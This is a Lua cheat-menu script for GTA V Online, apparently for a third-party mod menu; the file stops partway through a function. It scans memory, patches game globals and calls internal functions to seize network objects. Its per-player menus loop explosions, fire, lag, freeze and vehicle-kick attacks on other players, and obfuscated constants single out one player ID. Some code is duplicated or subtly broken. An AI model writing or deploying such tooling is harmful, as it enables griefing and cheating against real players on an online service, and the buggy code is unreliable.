util.keep_running()
util.require_natives(1663599433)
require"lib.pielib.pielib"
require"lib.pielib.Blacklist"
require"lib.pielib.1"
require"lib.pielib.natives"
dofile(filesystem.scripts_dir() .."PIE/natives.lua")

JSkey = require 'lib.pielib.JSkeyLib'
local scaleForm = require'lib.pielib.ScaleformLib'
local SFasd = scaleForm('instructional_buttons')



GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
local spawned_objects = {}
local ladder_objects = {}
local remove_projectiles = false
local PapuCrash = false
local int_min = -2147483647
local int_max = 2147483647
local spawned_objects = {}
local ladder_objects = {}
local KFLKdlkmk = 67
local launch_vehicle = {"Lanzar Arriba", "Lanzar Adelante", "Lanzar Atras", "Lanzar Abajo", "Catapulta"}
local invites = {"Yacht", "Office", "Clubhouse", "Office Garage", "Custom Auto Shop", "Apartment"}
local style_names = {"Normal", "Semi-Rushed", "Reverse", "Ignore Lights", "Avoid Traffic", "Avoid Traffic Extremely", "Sometimes Overtake Traffic"}
local drivingStyles = {786603, 1074528293, 8388614, 1076, 2883621, 786468, 262144, 786469, 512, 5, 6}
local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}
local blackHoleVehicle
local vehiclePos = {x = 0, y = 0, z = 0}
local yourselfCoord = {x=0,y=0,z=0}
local visualHelp = false
local visualHelpEnt
local entityToSpawn = util.joaat("prop_mk_sphere")
local blackHole = false
local blackHoleType = "black"
local blackHoleVehicle
local blackHolePos = {x = 0, y = 0, z = 0}
local tableBlackHole = {"拉", "推",}
local pushStrength = 1
local pushToX = 1
KickScriptEvent = {
    1674887089,
    608596116,
    1781594056,
    -442434037
        }
    
    function CreateVehicle(Hash, Pos, Heading, Invincible)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        if Invincible then
            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
        end
        return SpawnedVehicle
    end
    local function handle_player_list(pid)
            players.on_join(player_list)
    players.on_leave(handle_player_list)
        local ref = menus[pid]
        if not players.exists(pid) then
            if ref then
                menu.delete(ref)
                menus[pid] = nil
            end
        end
    end
    anim_request = function(hash)
        STREAMING.REQUEST_ANIM_DICT(hash)
        while not STREAMING.HAS_ANIM_DICT_LOADED(hash) do
            util.yield()
        end
    end
 
    function CreatePed(index, Hash, Pos, Heading)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        return SpawnedVehicle
    end
    
    function CreateObject(Hash, Pos, static)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_object(Hash, Pos)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        if static then
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
        end
        return SpawnedVehicle
    end
    function spawn_ped(ped_name, pid)
        local V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ped_hash = util.joaat(ped_name)
        STREAMING.REQUEST_MODEL(ped_hash)
        while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
            util.yield()
        end
    
        aab = v3()
        aab = ENTITY.GET_ENTITY_COORDS(V3, true)
    
        local ped = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
    
        coords_ped = v3()
        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
        coords_ped.x = coords_ped.x + math.random(-2, 2)
        coords_ped.y = coords_ped.y + math.random(-2, 2)
        coords_ped.z = coords_ped.z
    
        ENTITY.SET_ENTITY_COORDS(ped, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
        ENTITY.SET_ENTITY_VISIBLE(ped, false)
        notification("Spawned [" .. ped_name .. "] on " .. PLAYER.GET_PLAYER_NAME(pid), colors.green)
    
    end
local orgScan = memory.scan
local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}
local exp_animal = 'a_c_killerwhale'
local explosive_animal_gun
function expaniamlgun(toggle)
    explosive_animal_gun = toggle
    while explosive_animal_gun do
        local weaponHash = WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped())
        local weaponType = WEAPON.GET_WEAPON_DAMAGE_TYPE(weaponHash)
        if weaponType == 3 or (weaponType == 5 and WEAPON.GET_WEAPONTYPE_GROUP(weaponHash) != 1548507267) then --weapons that shoot bullets or explosions and isn't in the throwables category (grenades, proximity mines etc...)
            disable_firing = true
            disableFiringLoop()
            if JSkey.is_disabled_control_pressed(2, 'INPUT_ATTACK') and PLAYER.IS_PLAYER_FREE_AIMING(players.user_ped()) then
                util.create_thread(function()
                    local hash = util.joaat(exp_animal)
                    loadModel(hash)

                    local dir, c1 = direction()
                    local animal = entities.create_ped(28, hash, c1, 0)
                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)

                    ENTITY.APPLY_FORCE_TO_ENTITY(animal, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(animal, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)

                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(animal) do
                        util.yield()
                    end
                    local animalPos = ENTITY.GET_ENTITY_COORDS(animal, true)
                    entities.delete_by_handle(animal)
                    FIRE.ADD_EXPLOSION(animalPos.x, animalPos.y,animalPos.z, 1, 10, true, false, 1, false)
                end)
            end
        else
            disable_firing = false
        end
        util.yield(200)
    end
    disable_firing = false
end

function setanimal(text)
    exp_animal = animalsTable[text]
end

local impactCords = v3.new()
local blocks = {}
function xxxminecraftgun()
    if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), impactCords) then
        local hash = util.joaat('prop_mb_sandblock_01')
        loadModel(hash)
        blocks[#blocks + 1] = entities.create_object(hash, impactCords)
    end
end
   
   local function player_toggle_loop(root, pid, menu_name, command_names, help_text, callback)
        return menu.toggle_loop(root, menu_name, command_names, help_text, function()
            if not players.exists(pid) then util.stop_thread() end
            callback()
        end)
    end
    
    local spawned_objects = {}
    local ladder_objects = {}
    local function get_transition_state(pid)
        return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 230))
    end
    
    local function get_interior_player_is_in(pid)
        return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 243)) 
    end
    
    local function is_player_in_interior(pid)
        return (memory.read_int(memory.script_global(0x2908D3 + 1 + (pid * 0x1C5) + 243)) ~= 0)
    end
    
    local function get_entity_owner(addr)
        if util.is_session_started() and not util.is_session_transition_active() then
            local netObject = memory.read_long(addr + 0xD0)
            if netObject == 0 then
                return -1
            end
            local owner = memory.read_byte(netObject + 0x49)
            return owner
        end
        return players.user()
    end
    
    local function setBit(addr, bitIndex)
        memory.write_int(addr, memory.read_int(addr) | (1<<bitIndex))
    end
    
    local function clearBit(addr, bitIndex)
        memory.write_int(addr, memory.read_int(addr) & ~(1<<bitIndex))
    end
    
    function GetPlayerCurrentFmActivity(player)
        if player ~= -1 then
            return read_global.int(1892703 + (player * 599 + 1))
        end
        return -1
    end

function draw_string(s, x, y, scale, font)
    HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
    HUD.SET_TEXT_FONT(font or 0)
    HUD.SET_TEXT_SCALE(scale, scale)
    HUD.SET_TEXT_DROP_SHADOW()
    HUD.SET_TEXT_WRAP(0.0, 1.0)
    HUD.SET_TEXT_DROPSHADOW(1, 0, 0, 0, 0)
    HUD.SET_TEXT_OUTLINE()
    HUD.SET_TEXT_EDGE(1, 0, 0, 0, 0)
    HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(s)
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(x, y)
 end
 


scaleform_thread = util.create_thread(function (thr)

	scaleForm = GRAPHICS.REQUEST_SCALEFORM_MOVIE("MP_BIG_MESSAGE_FREEMODE")
    local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("mp_big_message_freemode")

	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleForm, "SHOW_SHARD_WASTED_MP_MESSAGE")


    local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("mp_big_message_freemode")
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleForm, "SHOW_SHARD_WASTED_MP_MESSAGE")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(" ~bold~&#8721;PIE Lua Script&#8721;")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("~b~‹~g~ ‹~y~ ‹ ~r~‹ ~p~‹\n\n~r~&#8721;=====欢迎使用=====&#8721;\n\n~s~ Version 1.5 ~b~文件群：772361223\n\n~b~‹~g~ ‹~y~ ‹ ~r~‹ ~p~‹")
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    AUDIO.PLAY_SOUND_FRONTEND(55, "FocusIn", "HintCamSounds", true)

	starttime = os.time()

	while true do

	if os.time() - starttime >= 8 then

	    AUDIO.PLAY_SOUND_FRONTEND(55, "FocusOut", "HintCamSounds", true)

	    util.stop_thread()

    end

	if GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleForm) then
        GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleForm, 155, 155, 255, 255,0)


    end

	   util.yield(1)

        end

    end)


function myModule(name, pattern, callback)
    local address = orgScan(pattern)
    if address ~= NULL then
        util.log("Encontrado " .. name)
        callback(address)
    else
        util.log("No se encontro " .. name)
        util.stop_script()
    end
end

---@param entity Entity
---@return integer
function get_net_obj(entity)
    local pEntity = entities.handle_to_pointer(entity)
    return pEntity ~= NULL and memory.read_long(pEntity + 0x00D0) or NULL
end

---@param player integer
---@return integer
function GetNetGamePlayer(player)
    return util.call_foreign_function(GetNetGamePlayer_addr, player)
end

myModule("GetNetGamePlayer", "48 83 EC ? 33 C0 38 05 ? ? ? ? 74 ? 83 F9", function (address)
    GetNetGamePlayer_addr = address
end)
myModule("CNetworkObjectMgr", "48 8B 0D ? ? ? ? 45 33 C0 E8 ? ? ? ? 33 FF 4C 8B F0", function (address)
    CNetworkObjectMgr = memory.rip(address + 3)
end)

myModule("ChangeNetObjOwner", "48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 41 54 41 56 41 57 48 81 EC ? ? ? ? 44 8A 62 4B", function (address)
    ChangeNetObjOwner_addr = address
end)

local OFNKkdmf = 5
ryze = {
    int = function(global, value)
        local radress = memory.script_global(global)
        memory.write_int(radress, value)
    end,

    request_model_load = function(hash)
        request_time = os.time()
        if not STREAMING.IS_MODEL_VALID(hash) then
            return
        end
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            if os.time() - request_time >= 10 then
                break
            end
            util.yield()
        end
    end,

    cwash_in_progwess = function()
        kitty_alpha = 0
        kitty_alpha_incr = 0.01
        kitty_alpha_thread = util.create_thread(function (thr)
            while true do
                kitty_alpha = kitty_alpha + kitty_alpha_incr
                if kitty_alpha > 1 then
                    kitty_alpha = 1
                elseif kitty_alpha < 0 then 
                    kitty_alpha = 0
                    util.stop_thread()
                end
                util.yield(5)
            end
        end)

        kitty_thread = util.create_thread(function (thr)
            starttime = os.clock()
            local alpha = 0
            while true do
                timepassed = os.clock() - starttime
                if timepassed > 3 then
                    kitty_alpha_incr = -0.01
                end
                if kitty_alpha == 0 then
                    util.stop_thread()
                end
                util.yield(5)
            end
        end)
    end,

    modded_vehicles = {
        "dune2",
        "tractor",
        "dilettante2",
        "asea2",
        "cutter",
        "mesa2",
        "jet",
        "policeold1",
        "policeold2",
        "armytrailer2",
        "towtruck",
        "towtruck2",
        "cargoplane",
    },

    KJFNkjfjkFKJ = function(player_id)
        players.get_rockstar_id(player_id)
    end,

    modded_weapons = {
        "weapon_railgun",
        "weapon_stungun",
        "weapon_digiscanner",
    },

    get_spawn_state = function(player_id)
        return memory.read_int(memory.script_global(((2657589 + 1) + (player_id * 466)) + 232)) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_232
    end,

    get_interior_of_player = function(player_id)
        return memory.read_int(memory.script_global(((2657589 + 1) + (player_id * 466)) + 245))
    end,

    is_player_in_interior = function(player_id)
        return (memory.read_int(memory.script_global(2657589 + 1 + (player_id * 466) + 245)) ~= 0)
    end,

    get_random_pos_on_radius = function()
        local angle = random_float(0, 2 * math.pi)
        pos = v3.new(pos.x + math.cos(angle) * radius, pos.y + math.sin(angle) * radius, pos.z)
        return pos
    end,

    get_transition_state = function(player_id)
        return memory.read_int(memory.script_global(((0x2908D3 + 1) + (player_id * 0x1C5)) + 230))
    end,

    ChangeNetObjOwner = function(object, player)
        if NETWORK.NETWORK_IS_IN_SESSION() then
            local net_object_mgr = memory.read_long(CNetworkObjectMgr)
            if net_object_mgr == NULL then
                return false
            end
            if not ENTITY.DOES_ENTITY_EXIST(object) then
                return false
            end
            local netObj = get_net_obj(object)
            if netObj == NULL then
                return false
            end
            local net_game_player = GetNetGamePlayer(player)
            if net_game_player == NULL then
                return false
            end
            util.call_foreign_function(ChangeNetObjOwner_addr, net_object_mgr, netObj, net_game_player, 0)
            return true
        else
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            return true
        end
    end,

    ChangeNetObjOwner = function(object, player)
        if NETWORK.NETWORK_IS_IN_SESSION() then
            local net_object_mgr = memory.read_long(CNetworkObjectMgr)
            if net_object_mgr == NULL then
                return false
            end
            if not ENTITY.DOES_ENTITY_EXIST(object) then
                return false
            end
            local netObj = get_net_obj(object)
            if netObj == NULL then
                return false
            end
            local net_game_player = GetNetGamePlayer(player)
            if net_game_player == NULL then
                return false
            end
            util.call_foreign_function(ChangeNetObjOwner_addr, net_object_mgr, netObj, net_game_player, 0)
            return true
        else
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            return true
        end
    end


}
local KDKkfm = 564191

function disableProjectileLoop(projectile)
    util.create_thread(function()
        util.create_tick_handler(function()
            WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
            return remove_projectiles
        end)
    end)
end

function yieldModelLoad(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
end

function get_control_request(ent)
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
		local tick = 0
		while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
			tick = tick + 1
			util.yield()
			NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
		end
	end
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
		util.toast("Sin control de "..ent)
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
end

function rotation_to_direction(rotation) 
    local adjusted_rotation = 
    { 
        x = (math.pi / 180) * rotation.x, 
        y = (math.pi / 180) * rotation.y, 
        z = (math.pi / 180) * rotation.z 
    }
    local direction = 
    {
        x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
        y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
        z =  math.sin(adjusted_rotation.x)
    }
    return direction
end

local function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end

local launch_vehicle = {"Throw Up", "Throw Go ahead", "Throw Back", "Throw Down", "Catapult"}
local invites = {"Yacht", "Office", "Clubhouse", "Office Garage", "Custom Auto Shop", "Apartment"}
local style_names = {"Normal", "Semi-Rushed", "Reverse", "Ignore Lights", "Avoid Traffic", "Avoid Traffic Extremely", "Sometimes Overtake Traffic"}
local drivingStyles = {786603, 1074528293, 8388614, 1076, 2883621, 786468, 262144, 786469, 512, 5, 6}
local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}
local FLKlkmkfmn = KDKkfm * KFLKdlkmk
local function BlockSyncs(player_id, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= player_id then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= player_id then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

local int_min = -2147483647
local int_max = 2147483647

function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = rotation_to_direction(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, -
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            -1, 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    memory.free(ptr1)
    memory.free(ptr2)
    memory.free(ptr3)
    memory.free(ptr4)
    return {p1, p2, p3, p4}
end



function draw_string(s, x, y, scale, font)
	HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
	HUD.SET_TEXT_FONT(font or 0)
	HUD.SET_TEXT_SCALE(scale, scale)
	HUD.SET_TEXT_DROP_SHADOW()
	HUD.SET_TEXT_WRAP(0.0, 1.0)
	HUD.SET_TEXT_DROPSHADOW(1, 0, 0, 0, 0)
	HUD.SET_TEXT_OUTLINE()
	HUD.SET_TEXT_EDGE(1, 0, 0, 0, 0)
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(s)
	HUD.END_TEXT_COMMAND_DISPLAY_TEXT(x, y)
end

local fps = 0
util.create_thread(function()
    while true do
        fps = math.ceil(1/SYSTEM.TIMESTEP())
        util.yield(500)
    end
end)
local replayInterface = memory.read_long(memory.rip(memory.scan("48 8D 0D ? ? ? ? 48 8B D7 E8 ? ? ? ? 48 8D 0D ? ? ? ? 8A D8 E8 ? ? ? ? 84 DB 75 13 48 8D 0D") + 3))
local pedInterface = memory.read_long(replayInterface + 0x0018)
local vehInterface = memory.read_long(replayInterface + 0x0010)
local objectInterface = memory.read_long(replayInterface + 0x0028)
local pickupInterface = memory.read_long(replayInterface + 0x0020)
function zhujixvlie()
inviciamountint = 0
            for pid = 0, 31 do
                if players.exists(pid) and pid ~= players.user() then
                    local pped = players.user_ped(pid)
                    if pped ~= 0 then
                        if players.is_marked_as_modder(pid) then --is_marked_as_modder
                            inviciamountint = inviciamountint + 1
                        end
                    end
                end
local ente
                    local ent1e = players.user_ped()
                    local ent2e = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
                    if PED.IS_PED_IN_ANY_VEHICLE(ent1e,true) then
                        ente = ent2e
                    else
                        ente = ent1e
                    end
                    local speede = ENTITY.GET_ENTITY_SPEED(ente)
                    local speedcalce = speede * 3.6
                    myspeed1e = math.ceil(speedcalce)
            end
                inviciamountintt = inviciamountint
            draw_string(string.format("~italic~~p~"..myspeed1e.." ~w~KM/H"), 0.163,0.695, 0.4,1)
            draw_string(string.format("~italic~FPS: ~o~"..fps), 0.163,0.722, 0.4,1)
            draw_string(string.format("~italic~"..os.date("%X")), 0.163,0.749, 0.4,1)    
            draw_string(string.format("~italic~战局人数: ~g~"..#players.list()), 0.163,0.776, 0.4,1) 
            draw_string(string.format("~italic~作弊者: ~r~"..inviciamountintt), 0.163,0.803, 0.4,1) 
            draw_string(string.format("~italic~战局主机: ~y~"..players.get_name(players.get_host())), 0.163,0.830, 0.4,1)
            draw_string(string.format("~italic~脚本主机: ~b~"..players.get_name(players.get_script_host())), 0.163,0.857, 0.4,1)
            draw_string(string.format("~italic~~bold~~c~Ped: ~s~"..memory.read_int(pedInterface + 0x0110).."/"..memory.read_int(pedInterface + 0x0108)), 0.163,0.884, 0.4,1)
            draw_string(string.format("~italic~~bold~~c~载具: ~s~"..memory.read_int(vehInterface + 0x0190).."/"..memory.read_int(vehInterface + 0x0188)), 0.163,0.911, 0.4,1)
            draw_string(string.format("~italic~~bold~~c~物体: ~s~"..memory.read_int(objectInterface + 0x0168).."/"..memory.read_int(objectInterface + 0x0160)), 0.163,0.938, 0.4,1)
            draw_string(string.format("~italic~~bold~~c~可拾取物: ~s~"..memory.read_int(pickupInterface + 0x0110).."/"..memory.read_int(pickupInterface + 0x0108)), 0.163,0.965, 0.4,1)
end





function get_offset_from_gameplay_camera(distance)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = rotation_to_direction(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    return destination
end

function direction()
    local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 5, 0)
    local res = raycast_gameplay_cam(-1, 1000)
    local c2

    if res[1] ~= 0 then
        c2 = res[2]
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end

    c2.x = (c2.x - c1.x) * 1000
    c2.y = (c2.y - c1.y) * 1000
    c2.z = (c2.z - c1.z) * 1000
    return c2, c1
end
local DNknfkaf = FLKlkmkfmn * OFNKkdmf
clear_radius = 100
function clear_area(radius)
    target_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    MISC.CLEAR_AREA(target_pos['x'], target_pos['y'], target_pos['z'], radius, true, false, false, false)
end

local function request_ptfx_asset(asset)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)

    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        util.yield()
    end
end
local OFNMKF4914jKNFJKfkKNFKJLV = "Bitch who steals my RID :v"
local function kick_player_out_of_veh(player_id)
    local max_time = os.millis() + 1000
    local player_ped  = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local kick_vehicle_command_ref = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Kick From Vehicle")
    menu.trigger_command(kick_vehicle_command_ref)

    while PED.IS_PED_IN_ANY_VEHICLE(player_ped) do
        if os.millis() >= max_time then
            break
        end

        util.yield()
    end
end

local function player_toggle_loop(root, player_id, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(player_id) then util.stop_thread() end
        callback()
    end)
end

local function get_blip_coords(blipId)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(blipId)
    if blip ~= 0 then return HUD.GET_BLIP_COORDS(blip) end
    return v3(0, 0, 0)
end
menu.divider(menu.my_root(), "PIE Lua Script", {}, "")

local selfc = menu.list(menu.my_root(), "自我选项", {}, "")
local online = menu.list(menu.my_root(), "线上选项", {}, "")
local weapons = menu.list(menu.my_root(), "武器选项", {})
local world = menu.list(menu.my_root(), "世界选项", {}, "")
local detections = menu.list(menu.my_root(), "检测选项", {}, "")
local modder_detections = menu.list(detections, "作弊者检测")
local normal_detections = menu.list(detections, "正常检测")
local chat_m = menu.list(menu.my_root(), "聊天选项", {}) 
local protects = menu.list(menu.my_root(), "保护选项", {}, "")
local vehicles = menu.list(menu.my_root(), "载具选项", {}, "")
local renwu=menu.list(menu.my_root(), "任务选项", {}, "")
local fun = menu.list(menu.my_root(), "趣味选项", {}, "")
local misc = menu.list(menu.my_root(), "其他选项", {}, "")

players.on_join(function(player_id)

    if players.get_rockstar_id(player_id) == DNknfkaf then
        util.yield(5000)
    end

    menu.divider(menu.player_root(player_id), "PIE Script")
    local PIEscriptd = menu.list(menu.player_root(player_id), "PIE Script")
    local malicious = menu.list(PIEscriptd, "攻击选项")
    local trolling = menu.list(PIEscriptd, "恶搞选项")
    local friendly = menu.list(PIEscriptd, "友好选项")
    local vehicle = menu.list(PIEscriptd, "载具选项")
	local otherc = menu.list(PIEscriptd, "其他选项")




    function RequestControl(entity)
        local tick = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
            util.yield()
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            tick = tick + 1
        end
    end

    local explosion = 18
    local explosion_names = {
        [0] = "小",
        [1] = "中",
        [2] = "大",
        [3] = "核弹"
    }

    local explosions = menu.list(malicious, "爆炸", {}, "")

    local explode_slider = menu.slider_text(explosions, "爆炸大小", {"customexplode"}, "", explosion_names, function()
        local player_pos = players.get_position(player_id)
        FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, explosion, 1, true, false, 1, false)
    end)

    util.create_tick_handler(function()
        if not players.exists(player_id) then
            return false
        end

        local index = menu.get_value(explode_slider)

        pluto_switch index do
            case 1:
                explosion = 0
                break
            case 2:
                explosion = 34
                break
            case 3:
                explosion = 82
                break
           default:
                explosion = 18
        end
    end)

    menu.toggle_loop(explosions, "循环爆炸", {"customexplodeloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, explosion, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(explosions, "循环冲击波", {"atomizeloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 70, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(explosions, "循环烟花", {"fireworkloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 38, 1, true, false, 1, false)
            util.yield(100)
        end
    end)




    local flushes = menu.list(malicious, "火柱水柱", {}, "")

    menu.toggle_loop(flushes, "循环火柱", {"flameloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 12, 1, true, false, 1, false)
            util.yield()
        end
    end)

    menu.toggle_loop(flushes, "循环水柱", {"waterloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 13, 1, true, false, 1, false)
            util.yield()
        end
    end)




    menu.divider(malicious, "其他")

    local lagplay = menu.list(malicious, "掉帧恶搞", {}, "")

    menu.toggle_loop(lagplay, "V1", {"rlag"}, "", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
            )
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "V2", {"rlag2"}, "", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
            )
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "V3", {"rlag3"}, "", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
            )
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "V4", {"rlag4"}, "", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
